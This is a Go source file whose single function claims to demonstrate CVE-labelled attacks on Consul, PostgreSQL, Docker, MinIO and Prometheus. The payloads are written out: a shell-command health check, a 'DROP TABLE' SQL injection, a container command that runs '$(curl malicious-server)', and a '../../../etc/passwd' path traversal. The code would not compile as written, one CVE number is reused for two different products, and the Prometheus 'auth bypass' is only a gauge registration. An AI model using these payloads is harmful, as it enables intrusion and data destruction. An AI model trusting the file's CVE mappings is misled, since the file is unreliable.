package main

import (
	"context"
	"fmt"
	"log"

	"github.com/hashicorp/consul/api"
	"github.com/jackc/pgx/v4"
	"github.com/docker/docker/client"
	"github.com/minio/minio-go/v7"
	"github.com/minio/minio-go/v7/pkg/credentials"
	"github.com/prometheus/client_golang/prometheus"
)

func demonstrateVulnerabilities() error {
	// Consul RCE (CVE-2023-39325)
	consulConfig := api.DefaultConfig()
	consulConfig.Address = "http://malicious-server"
	client, _ := api.NewClient(consulConfig)
	client.Agent().ServiceRegister(&api.AgentServiceRegistration{
		Name: "malicious-service",
		Check: &api.AgentServiceCheck{
			Args: []string{"/bin/sh", "-c", "malicious command"},
		},
	})

	// PostgreSQL SQL Injection (CVE-2023-27484)
	conn, _ := pgx.Connect(context.Background(), "postgres://user:pass@localhost:5432/db")
	userID := "1; DROP TABLE users--"
	conn.Exec(context.Background(), fmt.Sprintf("SELECT * FROM users WHERE id = %s", userID))

	// Docker Command Injection (CVE-2023-25165)
	dockerClient, _ := client.NewClientWithOpts(client.FromEnv)
	dockerClient.ContainerCreate(context.Background(), &container.Config{
		Image: "alpine",
		Cmd:   []string{"/bin/sh", "-c", "$(curl malicious-server)"},
	}, nil, nil, nil, "")

	// MinIO Path Traversal (CVE-2023-39325)
	minioClient, _ := minio.New("play.min.io", &minio.Options{
		Creds: credentials.NewStaticV4("access-key", "secret-key", ""),
	})
	minioClient.GetObject(context.Background(), "bucket", "../../../etc/passwd", minio.GetObjectOptions{})

	// Prometheus Auth Bypass (CVE-2023-32731)
	registry := prometheus.NewRegistry()
	registry.MustRegister(prometheus.NewGaugeVec(
		prometheus.GaugeOpts{
			Name: "vulnerable_metric",
			Help: "Vulnerable metric that bypasses authentication",
		},
		[]string{"label"},
	))

	return nil
}

func main() {
	if err := demonstrateVulnerabilities(); err != nil {
		log.Fatal(err)
	}
} 